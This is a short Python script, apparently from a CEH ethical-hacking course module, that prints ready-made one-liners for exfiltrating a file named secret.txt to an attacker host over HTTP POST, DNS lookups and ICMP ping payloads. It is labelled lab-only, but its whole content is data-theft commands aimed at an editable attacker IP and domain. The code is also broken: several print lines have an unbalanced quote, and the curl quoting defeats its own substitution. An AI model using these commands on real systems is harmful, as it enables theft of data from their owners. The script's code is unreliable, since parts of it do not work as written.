#!/usr/bin/env python3
# LAB-ONLY: Data Exfiltration Helper (LAB ONLY!)
# CEH v13 Master Module 07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates exfiltration methods (DNS, HTTP, ICMP, etc.)
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_DOMAIN = "your-lab-domain.com"
LAB_ATTACKER_IP = "192.168.100.1"
LAB_ATTACKER_PORT = 80
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Exfiltration Helper")
    print("="*80)
    print("-"*80")
    print("[*] Exfiltration methods (LAB ONLY):")
    print("-"*80")
    print("# 1. HTTP POST:")
    print(f"curl -X POST -d 'data=$(cat secret.txt)' http://{LAB_ATTACKER_IP}:{LAB_ATTACKER_PORT}")
    print("# 2. DNS:")
    print(f"for i in $(xxd -p secret.txt); do host $i.{LAB_ATTACKER_DOMAIN}; done")
    print("# 3. ICMP:")
    print(f"ping -c 1 -p $(xxd -p secret.txt) {LAB_ATTACKER_IP}")
    print("-"*80")

if __name__ == "__main__":
    main()
